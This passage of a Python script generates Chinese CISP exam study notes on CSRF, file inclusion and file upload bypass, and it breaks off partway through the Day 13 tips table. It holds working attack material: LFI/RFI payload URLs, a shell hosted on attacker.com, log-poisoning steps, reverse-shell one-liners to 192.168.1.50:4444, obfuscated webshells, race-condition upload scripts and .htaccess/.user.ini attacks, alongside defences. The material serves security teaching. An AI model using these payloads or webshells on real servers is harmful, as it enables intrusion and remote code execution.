> **"攻击三形式"** — GET型（img标签）、POST型（自动表单）、JSON型（fetch绕过）。记住：**"图表单取"**——图片、表单、fetch。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "CSRF是窃取用户数据" | ❌ 错误！CSRF借用身份执行操作，不窃取数据 |
| "SameSite=Strict就绝对安全" | ❌ 不绝对！可能存在浏览器兼容性问题 |
| "Token在Cookie中就安全" | ❌ 错误！双重提交Cookie模式可能被绕过 |
| "POST请求不会有CSRF" | ❌ 错误！POST CSRF通过自动提交表单实现 |

---

## 学习建议

1. 🔍 **理解同源策略**：CSRF本质上是利用了浏览器的默认行为（自动携带Cookie）
2. 🧪 **动手编写CSRF PoC**：在DVWA上练习GET和POST型CSRF
3. 🛡️ **学习防御实现**：理解CSRF Token的生成、存储、验证完整流程
4. 📊 **掌握组合攻击**：理解XSS+CSRF组合的威力
5. 🌐 **了解SameSite**：深入学习SameSite Cookie的工作机制

---

> **CSRF是一种"借刀杀人"的艺术——它不偷你的钥匙，而是趁你拿着钥匙的时候，握着你的手去开门。防御CSRF的本质，就是让每一次"开门"操作都经过你本人的确认。**
""")

# ===================================================================
# Day 12：文件包含漏洞
# ===================================================================
gen('day-12.md', """# Day 12：文件包含漏洞

> **📘 文档定位**：CISP 考试核心基础 | 难度：中级 | 预计阅读：45 分钟
>
> 文件包含漏洞（File Inclusion）是Web应用中最危险的漏洞之一。通过文件包含，攻击者可以读取服务器上的任意文件（如/etc/passwd），甚至执行远程恶意代码。本地文件包含（LFI）和远程文件包含（RFI）结合使用，往往能直接获取服务器控制权。

---

## 导航目录

- [一、文件包含漏洞概述](#一文件包含漏洞概述)
- [二、本地文件包含LFI](#二本地文件包含lfi)
- [三、远程文件包含RFI](#三远程文件包含rfi)
- [四、LFI日志文件包含](#四lfi日志文件包含)
- [五、PHP伪协议利用](#五php伪协议利用)
- [六、LFI到RCE提权链](#六lfi到rce提权链)
- [七、文件包含绕过技术](#七文件包含绕过技术)
- [八、自动化检测与利用](#八自动化检测与利用)
- [九、文件包含防御](#九文件包含防御)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、文件包含漏洞概述

### 1.1 漏洞原理

文件包含漏洞发生在应用使用用户可控的输入来动态包含文件时：

```php
// 漏洞代码示例
<?php
$page = $_GET['page'];
include($page . '.php');
?>
// URL: http://target.com/index.php?page=home
// 实际执行: include('home.php');

// 攻击：
// http://target.com/index.php?page=../../../../etc/passwd
// 实际执行: include('../../../../etc/passwd.php');
// 使用%00截断绕过.php后缀（PHP<5.3.4）
// http://target.com/index.php?page=../../../../etc/passwd%00
```

### 1.2 LFI vs RFI

| 特性 | LFI（本地文件包含） | RFI（远程文件包含） |
|:---|:---|:---|
| 文件位置 | 服务器本地文件系统 | 远程服务器 |
| 利用难度 | 中 | 高（需allow_url_include=On） |
| 典型危害 | 读取敏感文件、代码执行 | 直接远程代码执行 |
| PHP配置依赖 | 较低 | allow_url_include=On |
| 常见场景 | 模板引擎、语言切换 | 模板引擎、语言切换 |

> **🔑 高分考点**：LFI可以读取本地文件并可能导致RCE，RFI可以直接执行远程代码。PHP中RFI需要`allow_url_include=On`（默认Off）。

---

## 二、本地文件包含LFI

### 2.1 基础LFI利用

```bash
# Linux敏感文件
http://target.com/index.php?page=../../../../etc/passwd
http://target.com/index.php?page=../../../../etc/shadow
http://target.com/index.php?page=../../../../etc/hosts
http://target.com/index.php?page=../../../../etc/apache2/apache2.conf
http://target.com/index.php?page=../../../../var/log/apache2/access.log

# Windows敏感文件
http://target.com/index.php?page=../../../../windows/win.ini
http://target.com/index.php?page=../../../../windows/system32/drivers/etc/hosts
http://target.com/index.php?page=../../../../boot.ini
http://target.com/index.php?page=../../../../xampp/apache/logs/access.log

# 应用配置文件
http://target.com/index.php?page=config.php
http://target.com/index.php?page=../config.php
http://target.com/index.php?page=../../config/database.php
http://target.com/index.php?page=../../.env
http://target.com/index.php?page=../../wp-config.php
```

### 2.2 路径遍历深度

```bash
# 路径遍历技巧
# 不知道确切路径时，不断增加 ../
page=../etc/passwd
page=../../etc/passwd
page=../../../etc/passwd
page=../../../../etc/passwd
page=../../../../../etc/passwd
... (一直加到成功)

# Windows路径遍历
page=..\\..\\..\\windows\\win.ini
page=..\\..\\..\\..\\..\\..\\windows\\win.ini

# 使用/替代\\（Windows也接受）
page=../../../../windows/win.ini
```

---

## 三、远程文件包含RFI

### 3.1 RFI利用

```bash
# RFI条件：allow_url_include = On

# 基础RFI
http://target.com/index.php?page=http://attacker.com/shell.txt

# shell.txt内容：
<?php system($_GET['cmd']); ?>

# 执行命令
http://target.com/index.php?page=http://attacker.com/shell.txt&cmd=whoami

# 使用其他协议
http://target.com/index.php?page=ftp://attacker.com/shell.txt
http://target.com/index.php?page=data://text/plain,<?php system('id');?>

# 绕过allow_url_include=Off
# 使用SMB共享（Windows）
http://target.com/index.php?page=\\attacker.com\share\shell.txt
```

### 3.2 RFI Payload托管

```bash
# 快速搭建RFI Payload服务器
python3 -m http.server 80

# 或使用PHP内置服务器
php -S 0.0.0.0:80

# shell.txt内容变体
# 基础WebShell
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>

# 更隐蔽的WebShell
<?php 
@extract($_REQUEST);
@die($cmd($param));
// 访问: shell.txt?cmd=system&param=whoami
?>
```

---

## 四、LFI日志文件包含

### 4.1 Apache日志污染

```bash
# 攻击流程：污染日志 → 包含日志 → 执行代码

# Step 1: 污染Apache access.log
# 在User-Agent中注入PHP代码
curl -H "User-Agent: <?php system('id'); ?>" http://target.com/

# 或者使用nc直接发送
nc target.com 80 << EOF
GET /<?php system('id'); ?> HTTP/1.1
Host: target.com

EOF

# Step 2: 包含日志文件
http://target.com/index.php?page=../../../../var/log/apache2/access.log
http://target.com/index.php?page=../../../../var/log/httpd/access_log
http://target.com/index.php?page=../../../../var/log/apache/access.log

# 常见日志路径
# Debian/Ubuntu: /var/log/apache2/access.log
# CentOS/RHEL: /var/log/httpd/access_log
# XAMPP: /xampp/apache/logs/access.log
# FreeBSD: /var/log/httpd-access.log
```

### 4.2 SSH日志污染

```bash
# Step 1: 通过SSH连接污染auth.log
ssh '<?php system($_GET["cmd"]); ?>'@target.com
# 连接失败，但用户名被记录到auth.log

# Step 2: 包含SSH日志
http://target.com/index.php?page=../../../../var/log/auth.log&cmd=id
# 或
http://target.com/index.php?page=../../../../var/log/secure&cmd=id

# 其他可污染日志
# /var/log/mail.log - 邮件日志
# /var/log/vsftpd.log - FTP日志
# /proc/self/environ - 环境变量（User-Agent注入）
```

### 4.3 /proc/self/environ利用

```bash
# 通过User-Agent注入到/proc/self/environ
# 使用Burp Suite修改User-Agent
GET /index.php?page=../../../../proc/self/environ HTTP/1.1
User-Agent: <?php system('id'); ?>

# 如果/proc/self/environ可读
# PHP代码会被执行
```

---

## 五、PHP伪协议利用

### 5.1 php://filter

```bash
# php://filter - 读取文件源码
# 直接包含PHP文件会被执行而非显示源码
# 使用php://filter进行base64编码读取

# 读取PHP源码
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
# 获取base64编码的源码，解码即可查看

# 读取配置文件
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=../admin/dashboard.php

# 使用其他过滤器
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php

# 无resource参数（PHP<5.3）
php://filter/convert.base64-encode/resource=../../../../etc/passwd
```

### 5.2 php://input

```bash
# php://input - 读取POST原始数据
# 条件：allow_url_include=On

# 使用curl发送POST数据
curl -X POST http://target.com/index.php?page=php://input -d "<?php system('id'); ?>"

# 使用Burp Suite
POST /index.php?page=php://input HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

<?php system('whoami'); ?>
```

### 5.3 data://协议

```bash
# data:// - 内联数据
# 条件：allow_url_include=On

# Base64编码
http://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# 纯文本
http://target.com/index.php?page=data://text/plain,<?php system('id'); ?>

# 注意：data:// 中的 + 和 / 需要URL编码
# 等价于：<?php system('id'); ?>
# PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

### 5.4 expect://协议

```bash
# expect:// - 执行系统命令
# 条件：安装了expect扩展

http://target.com/index.php?page=expect://id
http://target.com/index.php?page=expect://whoami
http://target.com/index.php?page=expect://ls -la
```

### 5.5 phar://协议

```bash
# phar:// - PHP归档文件
# 可以用于反序列化攻击

# 上传一个phar文件（伪装成图片）
# 然后通过phar://包含
http://target.com/index.php?page=phar://uploads/evil.jpg/shell.php
```

---

## 六、LFI到RCE提权链

### 6.1 完整LFI→RCE攻击链

```bash
# 攻击链：LFI → 日志污染 → RCE → 反弹Shell

# Step 1: 确认LFI存在
curl "http://target.com/index.php?page=../../../../etc/passwd"
# 如果返回passwd内容，确认LFI

# Step 2: 污染Apache日志
curl -H "User-Agent: <?php system('id'); ?>" http://target.com/

# Step 3: 包含日志验证RCE
curl "http://target.com/index.php?page=../../../../var/log/apache2/access.log"
# 如果看到id命令的输出，确认RCE

# Step 4: 反弹Shell
# 先污染日志注入反弹Shell代码
curl -H "User-Agent: <?php system('bash -c \"bash -i >& /dev/tcp/192.168.1.50/4444 0>&1\"'); ?>" http://target.com/
# 或者使用Python反弹Shell
curl -H "User-Agent: <?php system('python3 -c \\\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\\\"192.168.1.50\\\\\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\\\\\"/bin/sh\\\\\\\",\\\\\\\"-i\\\\\\\"])\\\"'); ?>" http://target.com/

# Step 5: 在攻击机上监听
nc -lvnp 4444

# Step 6: 触发包含
curl "http://target.com/index.php?page=../../../../var/log/apache2/access.log"
```

### 6.2 利用文件上传+包含

```bash
# 如果有文件上传功能，可以结合LFI

# Step 1: 上传包含恶意代码的图片
# 图片内容（在EXIF/Comment中注入PHP代码）
# 或直接上传PHP文件（如果允许）

# Step 2: 通过LFI包含上传的文件
http://target.com/index.php?page=../../uploads/shell.jpg
# PHP会忽略图片内容，执行其中嵌入的PHP代码
```

---

## 七、文件包含绕过技术

### 7.1 后缀绕过

```bash
# 场景：include($page . '.php');
# 需要绕过.php后缀

# 方法1：%00截断（PHP<5.3.4）
http://target.com/index.php?page=../../../../etc/passwd%00

# 方法2：路径长度截断（PHP<5.2.8）
# 使用超长路径（4096字符以上）
http://target.com/index.php?page=../../../../etc/passwd/././././././.[...超过4096字符]

# 方法3：点号截断（PHP<5.2.8）
http://target.com/index.php?page=../../../../etc/passwd...........................

# 方法4：? 问号截断
http://target.com/index.php?page=http://attacker.com/shell.txt?

# 方法5：# 井号截断
http://target.com/index.php?page=http://attacker.com/shell.txt%23

# 方法6：路径截断（使用zip://, phar://）
http://target.com/index.php?page=zip://uploads/shell.jpg%23shell
```

### 7.2 关键字过滤绕过

```bash
# 场景：过滤了 ../, etc, passwd 等关键字

# 绕过 ../
page=....//....//....//....//etc/passwd
page=..././..././..././..././etc/passwd
page=..%252f..%252f..%252f..%252fetc/passwd  # 双重URL编码
page=..\\/..\\/..\\/..\\/etc/passwd          # 路径分隔符变换

# 绕过 etc/passwd
page=../../../../etc/passwd%00
page=../../../../etc/passwd/.

# 使用绝对路径
page=/etc/passwd
page=file:///etc/passwd

# 使用符号链接
# 如果服务器存在指向/etc的符号链接
```

---

## 八、自动化检测与利用

### 8.1 LFISuite

```bash
# LFISuite - LFI自动化利用工具
git clone https://github.com/D35m0nd142/LFISuite.git
cd LFISuite
python3 lfisuite.py

# 功能：
# - 自动LFI检测
# - 路径遍历深度自动探测
# - /proc/self/environ利用
# - php://filter利用
# - 日志污染
```

### 8.2 fimap

```bash
# fimap - LFI/RFI扫描和利用工具
python3 fimap.py -u "http://target.com/index.php?page=home"
python3 fimap.py -m -u "http://target.com/index.php?page=home"  # 批量
python3 fimap.py -H -u "http://target.com/index.php?page=home"  # 收获

# 功能：
# - 自动检测LFI/RFI
# - 多种利用技术
# - 交互式Shell
```

---

## 九、文件包含防御

### 9.1 防御措施

| 防御方法 | 实现方式 | 有效性 |
|:---|:---|:---|
| 白名单 | 仅允许包含预定义文件列表 | 最高 |
| 禁用远程包含 | allow_url_include=Off | 防RFI |
| 路径过滤 | 过滤 ../, ..\\ 等路径遍历字符 | 中（可绕过）|
| 基目录限制 | 强制所有包含基于特定目录 | 高 |
| 禁用危险函数 | disable_functions | 中 |
| open_basedir | 限制PHP可访问的目录 | 高 |

### 9.2 安全代码示例

```php
<?php
// 安全的白名单方式
$allowed_pages = ['home', 'about', 'contact', 'products'];
$page = $_GET['page'] ?? 'home';

if (in_array($page, $allowed_pages)) {
    include('pages/' . $page . '.php');
} else {
    include('pages/404.php');
}

// 安全的基目录方式
$page = $_GET['page'] ?? 'home';
// 移除路径遍历字符
$page = str_replace(['../', '..\\'], '', $page);
// 规范化路径
$file = realpath('pages/' . $page . '.php');
// 验证文件在允许的目录内
if (strpos($file, '/var/www/html/pages/') === 0) {
    include($file);
}
?>
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | LFI定义 | ★★★★★ | ★ | 包含服务器本地文件 |
| 2 | RFI定义 | ★★★★★ | ★ | 包含远程服务器文件 |
| 3 | RFI条件 | ★★★★ | ★★ | allow_url_include=On |
| 4 | PHP伪协议 | ★★★★★ | ★★ | php://filter, php://input, data:// |
| 5 | 日志污染 | ★★★★ | ★★★ | 污染Apache/SSH日志实现RCE |
| 6 | 路径遍历 | ★★★★ | ★★ | ../逐级向上遍历目录 |
| 7 | %00截断 | ★★★★ | ★★ | PHP<5.3.4绕过后缀添加 |
| 8 | /proc/self/environ | ★★★ | ★★★ | User-Agent注入实现RCE |
| 9 | 文件包含防御 | ★★★★ | ★★ | 白名单+allow_url_include=Off+open_basedir |
| 10 | LFI→RCE链 | ★★★★ | ★★★ | 日志污染→包含日志→代码执行 |

### 💡 知识巧记口诀

> **"伪协议三剑客"** — php://filter（读源码）、php://input（POST执行）、data://（内联代码）。记住：**"filter读，input写，data自带"**。

> **"LFI提权四步走"** — 确认LFI → 污染日志 → 包含日志 → 获取Shell。记住：**"确污含取"**。

> **"防御三板斧"** — 白名单限制文件、allow_url_include=Off禁远程、open_basedir限目录。记住：**"白关限"**。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "LFI只能读文件不能执行代码" | ❌ 错误！通过日志污染、php://input等可RCE |
| "RFI需要allow_url_fopen=On" | ❌ 错误！RFI需要allow_url_include=On |
| "%00截断在所有PHP版本有效" | ❌ 错误！PHP>=5.3.4已修复%00截断 |
| "过滤../就能防路径遍历" | ❌ 错误！可使用绝对路径或编码绕过 |

---

## 学习建议

1. 🧪 **搭建LFI练习环境**：使用DVWA、bWAPP等平台练习
2. 🔍 **理解PHP配置**：掌握allow_url_include、open_basedir、disable_functions的作用
3. 📝 **建立伪协议清单**：熟练使用php://filter、php://input、data://
4. 🛡️ **学习日志路径**：记住不同系统的Apache/Nginx/SSH日志路径
5. 🔗 **掌握LFI→RCE链**：日志污染是最实用的LFI提权技术

---

> **文件包含漏洞就像一扇"任意门"——输入一个路径，就能抵达服务器的任何角落。掌握了文件包含，你就掌握了通往服务器文件系统和命令执行的钥匙。**
""")

print("\nDays 1-12 done, continuing with days 13-20...")

# ===================================================================
# Day 13：文件上传绕过
# ===================================================================
gen('day-13.md', """# Day 13：文件上传绕过

> **📘 文档定位**：CISP 考试核心基础 | 难度：中级 | 预计阅读：45 分钟
>
> 文件上传漏洞是Web应用中最直接、最危险的漏洞之一。攻击者通过上传恶意文件（WebShell），可以直接在服务器上执行任意命令。尽管大多数应用都有文件上传验证机制，但绕过这些验证的方法层出不穷。本章将全面覆盖文件上传的各种绕过技术。

---

## 导航目录

- [一、文件上传漏洞概述](#一文件上传漏洞概述)
- [二、前端验证绕过](#二前端验证绕过)
- [三、MIME类型验证绕过](#三mime类型验证绕过)
- [四、文件扩展名绕过](#四文件扩展名绕过)
- [五、文件内容验证绕过](#五文件内容验证绕过)
- [六、WebShell编写技术](#六webshell编写技术)
- [七、条件竞争上传](#七条件竞争上传)
- [八、.htaccess与配置文件攻击](#八htaccess与配置文件攻击)
- [九、文件上传自动化](#九文件上传自动化)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、文件上传漏洞概述

### 1.1 漏洞原理

文件上传漏洞发生在应用未对上传文件的类型、内容进行充分验证时：

```
文件上传攻击链：
上传恶意文件 → 绕过验证 → 获取文件路径 → 访问文件 → 执行恶意代码 → 获取服务器控制权
```

### 1.2 验证层级与绕过

| 验证层级 | 描述 | 绕过难度 |
|:---|:---|:---|
| 前端JS验证 | 浏览器端验证 | 极低 |
| Content-Type验证 | 检查MIME类型 | 低 |
| 文件扩展名验证 | 黑名单/白名单 | 中 |
| 文件头验证 | 检查Magic Bytes | 中 |
| 图片处理验证 | 图片二次渲染 | 高 |
| 文件内容检测 | 检测PHP标签 | 中高 |

> **🔑 高分考点**：文件上传绕过是分层进行的，每层有对应的绕过技术。前端JS验证最容易绕过，图片二次渲染最难绕过。

---

## 二、前端验证绕过

### 2.1 禁用JavaScript

```bash
# 方法1：浏览器禁用JavaScript
# Firefox: about:config → javascript.enabled → false
# Chrome: 设置 → 隐私 → 网站设置 → JavaScript → 阻止

# 方法2：删除onsubmit事件
# F12 → 检查元素 → 找到form标签 → 删除onsubmit属性

# 方法3：修改allowedExtensions
# F12 → Console
document.querySelector('input[type="file"]').accept = '*/*';
```

### 2.2 Burp Suite绕过

```bash
# 方法1：直接发送到Repeater
# 1. 选择合法文件（如.jpg）
# 2. 开启Burp拦截
# 3. 修改filename为shell.php
# 4. 修改Content-Type为image/jpeg
# 5. 修改文件内容为WebShell代码

# 方法2：修改请求体
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

### 2.3 cURL直接上传

```bash
# 使用curl绕过前端验证
curl -X POST http://target.com/upload.php \
  -F "file=@shell.php;type=image/jpeg" \
  -F "submit=Upload"

# 指定Content-Type
curl -X POST http://target.com/upload.php \
  -H "Content-Type: multipart/form-data" \
  -F "file=@shell.php;filename=shell.php;type=image/jpeg"
```

---

## 三、MIME类型验证绕过

### 3.1 Content-Type绕过

```bash
# 服务器端验证代码示例
if ($_FILES['file']['type'] != 'image/jpeg' && 
    $_FILES['file']['type'] != 'image/png') {
    die('Only images allowed');
}

# 绕过：修改Content-Type
# Burp Suite中修改
Content-Type: image/jpeg     # 伪装成JPEG
Content-Type: image/png      # 伪装成PNG
Content-Type: image/gif      # 伪装成GIF

# curl中指定
curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload.php
```

### 3.2 常用可绕过Content-Type

```bash
# 图片类型
image/jpeg
image/png
image/gif
image/bmp
image/webp
image/tiff

# 文档类型（某些应用）
application/pdf
text/plain
application/octet-stream

# 其他
application/x-php  # 极少允许
```

---

## 四、文件扩展名绕过

### 4.1 黑名单绕过

```bash
# 假设黑名单过滤了：php, php3, php4, php5, phtml

# 使用未在名单中的扩展名
shell.php7       # PHP 7
shell.pht        # PHP HTML Template
shell.phar       # PHP Archive
shell.phps       # PHP Source
shell.phtml      # PHP HTML
shell.shtml      # 含SSI的HTML
shell.php.jpg    # 双重扩展名

# 大小写绕过
shell.Php
shell.pHp
shell.PHP
shell.PHP5

# 空格绕过
shell.php .      # 尾部空格
shell.php.       # 尾部点号

# Windows特殊字符
shell.php:1.jpg  # NTFS备用数据流
shell.php::$DATA # NTFS数据流
```

### 4.2 解析漏洞利用

```bash
# Apache解析漏洞
# 1. 从右到左解析
shell.php.xxx     # 如果.xxx不被识别，解析为.php
shell.php.abc.def # 逐级向左解析

# 2. .htaccess覆盖
# 上传.htaccess文件
AddType application/x-httpd-php .jpg
# 之后所有.jpg文件被解析为PHP

# IIS解析漏洞
# 1. ;截断
shell.asp;.jpg    # IIS 6解析为.asp

# 2. 目录解析
/upload/shell.asp/shell.jpg  # IIS 6将.jpg当.asp解析

# 3. 文件名解析（IIS 7.5+）
shell.jpg/.php    # FastCGI配置不当

# Nginx解析漏洞
# 1. 文件路径解析
http://target.com/upload/shell.jpg/1.php
# 如果Nginx配置了fastcgi_split_path_info
# 会将shell.jpg作为PHP执行

# 2. %00截断
shell.jpg%00.php  # PHP<5.3.4
```

### 4.3 白名单绕过

```bash
# 白名单通常更安全，但也有绕过方法

# 方法1：双重扩展名（取决于解析器）
shell.jpg.php     # 取最后一个.php

# 方法2：利用解析漏洞
shell.php%00.jpg  # 如果后端使用C语言处理，%00可能截断

# 方法3：.htaccess + 合法文件
# 先上传.htaccess：AddType application/x-httpd-php .jpg
# 再上传包含PHP代码的.jpg文件

# 方法4：配置文件
# .user.ini (PHP-FPM)
# auto_prepend_file=shell.jpg
```

---

## 五、文件内容验证绕过

### 5.1 文件头（Magic Bytes）绕过

```bash
# 文件头验证：检查文件开头的Magic Bytes
# 绕过：在WebShell前面添加合法文件头

# 制作图片马
# Windows
copy /b image.jpg + shell.php shell_image.jpg

# Linux
cat image.jpg shell.php > shell_image.jpg

# 或使用十六进制编辑器直接添加文件头

# 常用Magic Bytes
# JPEG: FF D8 FF E0
# PNG:  89 50 4E 47
# GIF:  47 49 46 38  (GIF89a)
# BMP:  42 4D

# PHP GIF马示例（最简单）
GIF89a
<?php system($_GET['cmd']); ?>

# 保存为 shell.gif 上传
# GIF的Magic Bytes就是文本"GIF89a"
```

### 5.2 图片二次渲染绕过

```bash
# 高级验证：服务器对图片进行二次渲染（如生成缩略图）
# 这会破坏嵌入的PHP代码

# GIF绕过（相对容易）
# 在GIF文件的Comment区域插入PHP代码
# 使用工具：gifjs或手动十六进制编辑

# PNG绕过（较难）
# 使用IDAT块插入PHP代码
# 工具：php_png_metashell

# JPEG绕过（最难）
# 使用EXIF数据区插入PHP代码
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
# 需要测试二次渲染是否保留了EXIF数据

# 通用方法：找不变的字节区域
# 上传图片 → 下载渲染后的图片 → 对比找出未改变的区域 → 在此区域插入代码
```

### 5.3 getimagesize()绕过

```php
// 服务器验证代码
$info = getimagesize($_FILES['file']['tmp_name']);
if ($info === false) {
    die('Not a valid image');
}
// getimagesize() 检查文件头，不检查文件扩展名
```

```bash
# 绕过方法
# 1. 制作含合法文件头的图片马
GIF89a
<?php system($_GET['cmd']); ?>

# 2. 使用EXIF数据区
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# 3. 对PNG使用php_png_metashell
python3 php_png_metashell.py -i input.png -o shell.png -p "<?php system('id'); ?>"
```

---

## 六、WebShell编写技术

### 6.1 PHP WebShell

```php
<?php
// 1. 基础一句话
<?php @eval($_POST['cmd']); ?>

// 2. GET方式
<?php system($_GET['cmd']); ?>

// 3. 免杀一句话
<?php
$a = 's'.'y'.'s'.'t'.'e'.'m';
$a($_GET['cmd']);
?>

// 4. 编码混淆
<?php
$k = base64_decode('c3lzdGVt');
$k($_GET['cmd']);
?>

// 5. 使用回调函数
<?php
call_user_func('system', $_GET['cmd']);
?>

// 6. 无字母数字WebShell
<?php
$_ = [];
$_ = @"$"; // $_ = 'Array';
$__ = $_['!'=='@']; // $__ = $_
$___ = $__[0]; // A
// ... 通过异或/取反构造任意字符
?>

// 7. PHP 7+ 一句话
<?php ($_=@$_GET[1]) && @substr($_,0,1)==='c' ? system($_) : null; ?>
// 访问：shell.php?1=cmd
```

### 6.2 ASP/ASPX WebShell

```asp
<!-- ASP一句话 -->
<%eval request("cmd")%>
<%execute request("cmd")%>
```

```csharp
<!-- ASPX一句话 -->
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>
```

### 6.3 JSP WebShell

```jsp
<%
    if(request.getParameter("cmd") != null) {
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        java.io.BufferedReader br = new java.io.BufferedReader(
            new java.io.InputStreamReader(p.getInputStream()));
        String line;
        while((line = br.readLine()) != null) {
            out.println(line);
        }
    }
%>
```

---

## 七、条件竞争上传

### 7.1 条件竞争原理

```bash
# 场景：服务器先上传文件，再验证，不合法则删除
# 攻击：在验证和删除之间的时间窗口内访问文件

# 攻击脚本
#!/bin/bash
# race_condition.sh
while true; do
    curl -s http://target.com/uploads/shell.php | grep "uid=" && break
    sleep 0.01
done &

while true; do
    curl -s -F "file=@shell.php" http://target.com/upload.php
    sleep 0.01
done

# 使用Python提高速度
import threading
import requests

def upload():
    while True:
        files = {{'file': open('shell.php', 'rb')}}
        requests.post('http://target.com/upload.php', files=files)

def access():
    while True:
        r = requests.get('http://target.com/uploads/shell.php')
        if 'uid=' in r.text:
            print('[+] Shell uploaded!')
            break

threading.Thread(target=upload, daemon=True).start()
threading.Thread(target=access, daemon=True).start()
```

### 7.2 Burp Turbo Intruder条件竞争

```python
# Turbo Intruder脚本
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=True)
    
    # 上传请求
    upload_req = '''POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=x

--x
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system('id'); ?>
--x--
'''
    
    # 访问请求
    access_req = '''GET /uploads/shell.php HTTP/1.1
Host: target.com


'''
    
    for i in range(1000):
        engine.queue(upload_req)
        engine.queue(access_req)

def handleResponse(req, interesting):
    if 'uid=' in req.response:
        table.add(req)
```

---

## 八、.htaccess与配置文件攻击

### 8.1 .htaccess攻击

```bash
# Apache .htaccess覆盖攻击
# 上传包含以下内容的.htaccess文件

# 将.jpg文件解析为PHP
AddType application/x-httpd-php .jpg

# 将.shell文件解析为PHP
AddHandler application/x-httpd-php .shell

# 使用SetHandler
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>

# 包含自定义php.ini
php_value auto_prepend_file shell.jpg

# 执行CGI
Options +ExecCGI
AddHandler cgi-script .cgi

# 绕过文件名限制
# 上传 .htaccess 后，再上传含PHP代码的 .jpg 文件
```

### 8.2 .user.ini攻击（PHP-FPM）

```bash
# .user.ini 是PHP的每目录配置文件
# 类似Apache的.htaccess

# 上传.user.ini文件
auto_prepend_file=shell.jpg
# 或
auto_append_file=shell.jpg

# 所有PHP文件执行前都会先包含shell.jpg
# shell.jpg包含PHP代码

# 使用条件：PHP-FPM + user_ini.filename未禁用
```

### 8.3 web.config攻击（IIS）

```xml
<!-- IIS web.config攻击 -->
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Script, Write">
            <add name="PHP_via_FastCGI" path="*.jpg" verb="*"
                 modules="FastCgiModule"
                 scriptProcessor="C:\PHP\php-cgi.exe"
                 resourceType="Either" />
        </handlers>
    </system.webServer>
</configuration>
```

---

## 九、文件上传自动化

### 9.1 Fuxploider

```bash
# Fuxploider - 文件上传自动化工具
python3 fuxploider.py --url http://target.com/upload.php
python3 fuxploider.py --url http://target.com/upload.php --not-regex "not allowed"
python3 fuxploider.py --url http://target.com/upload.php --type php

# 功能：
# - 自动检测上传点
# - 多种绕过技术
# - 自动识别成功上传
```

### 9.2 Upload_Scanner (Burp扩展)

```bash
# Burp Suite 上传扫描扩展
# 1. 在Burp中安装 Upload Scanner
# 2. 发送上传请求到Scanner
# 3. 自动测试多种绕过技术
# 4. 识别成功绕过的方法
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | 文件上传危害 | ★★★★★ | ★ | 上传WebShell获取服务器控制权 |
| 2 | 前端验证绕过 | ★★★★ | ★ | 禁用JS/Burp拦截/curl直接发送 |
| 3 | Content-Type绕过 | ★★★★ | ★ | 修改为image/jpeg等合法MIME |
| 4 | 扩展名黑名单绕过 | ★★★★★ | ★★ | pht/phtml/php7/大小写/空格/点号 |
| 5 | 文件头绕过 | ★★★★ | ★★ | 添加GIF89a等Magic Bytes |
| 6 | .htaccess攻击 | ★★★★ | ★★ | AddType使.jpg解析为PHP |
| 7 | 图片二次渲染 | ★★★ | ★★★ | 在不变区域嵌入代码 |
| 8 | 条件竞争 | ★★★★ | ★★★ | 上传和访问并发执行 |
| 9 | %00截断 | ★★★★ | ★★ | PHP<5.3.4绕过扩展名限制 |
| 10 | Apache解析漏洞 | ★★★★ | ★★ | 从右到左解析，shell.php.xxx |

### 💡 知识巧记口诀

> **"上传绕过五层楼"** — 前端JS（禁用）、MIME类型（修改）、扩展名（变换）、文件头（添加）、图片渲染（找不变区）。记住：**"前禁M改扩变头添图找"**。

> **"WebShell三件套"** — 一句话（eval/system）、编码混淆（base64）、免杀变形（回调函数）。记住：**"一句话编码免杀"**。

> **"扩展名绕过六法"** — 大小写、双扩展、空格、点号、%00截断、解析漏洞。记住：**"大双空点零解"**。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "白名单绝对安全" | ❌ 错误！可能通过.htaccess或解析漏洞绕过 |
| "图片文件不能包含PHP代码" | ❌ 错误！可在EXIF/Comment中嵌入PHP代码 |
